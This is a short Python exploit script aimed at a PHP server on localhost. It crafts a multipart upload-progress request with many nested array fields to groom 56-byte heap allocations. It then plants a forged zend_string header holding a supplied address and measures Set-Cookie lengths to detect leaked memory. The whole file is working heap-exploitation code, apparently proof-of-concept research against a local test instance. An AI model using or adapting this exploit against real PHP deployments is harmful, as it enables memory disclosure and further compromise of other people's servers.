#!/usr/bin/env python3
"""M nested arrays allocate 56B HashTables; a 55-byte forge value (56B raw)
carries a fake zend_string header and is the last 56B allocation.
usage: b_ht56.py M LEAK [KEY]
"""
import socket,sys,struct
M=int(sys.argv[1]); LEAK=int(sys.argv[2],0); KEY=int(sys.argv[3]) if len(sys.argv)>3 else 128
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(M):
    parts.append({'n':'a%04d[%d]'%(i,KEY),'d':b'x'})
v=bytearray(b'A'*55); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x1a]=b'LZ'
parts.append({'n':'forge','d':bytes(v)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<32000000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:100].decode('latin1','replace'))
print('HEAD_LEN',len(head),'FIELDS',M+3,'BODY',rest[:100].decode('latin1','replace'))
open('/tmp/b_ht56.resp','wb').write(data)
